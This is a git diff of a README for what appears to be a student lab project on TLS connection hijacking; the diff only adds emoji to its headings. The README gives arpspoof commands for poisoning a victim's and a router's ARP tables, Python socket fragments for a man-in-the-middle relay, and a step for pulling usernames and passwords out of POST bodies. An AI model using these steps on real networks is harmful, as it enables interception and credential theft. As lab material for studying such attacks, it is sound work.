@@ -1,19 +1,19 @@
-## Project 1 - TLS Connection Hijacking
+## 🧪Project 1 - TLS Connection Hijacking
 
-### GOAL
+### 🎯GOAL
 - Make use of arpspoofing to deceive router and victim
 - Establish TLS connections between both attacker and victim, and attacker and web server
 - Parsing HTML packets to ensure that the victim's browser displays the webpage properly.
 - __Steal the password__ while victim is entering the login page
 
-### STEP1 - ARP Spoofing
+### 🧨STEP1 - ARP Spoofing
 Make the __victim / router__ assume that the attacker is where the packet should go at next hop (originally the router / victim) by deceiving the arp packets.
 ```bash
 sudo arpspoof -i <INTERFACE> -t <GATEWAY_IP> <CLIENT_IP>
 sudo arpspoof -i <INTERFACE> -t <CLIENT_IP> <GATEWAY_IP>
 ```
 
-### STEP2 - Hijacking a TLS Connection
+### 🧨STEP2 - Hijacking a TLS Connection
 Create a socket to make connection with victim, based on the previous ARP spoofing, the victim sends packets to the attacker.
 ```python
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -34,7 +34,7 @@ server_connection.connect((host, port))
 server_connection.sendall(request)
 ```
 
-### STEP3 - Handle Large Packets
+### 🧨STEP3 - Handle Large Packets
 Normally, the size of a website is huge that one must handle packet several times. By parsing HTML header, coping with large packets will be much easier.
 - HTML header format
   - "\r\n\r\n" at the end of header
@@ -54,7 +54,7 @@ pedia\r\n
 \r\n
 ```
 
-### STEP4 - STEAL Password
+### 🧨STEP4 - STEAL Password
 - Find header named "Type", if the type of this request is post, check HTML body and the body format will be,
 ```text
 username=<username>&password=<password>
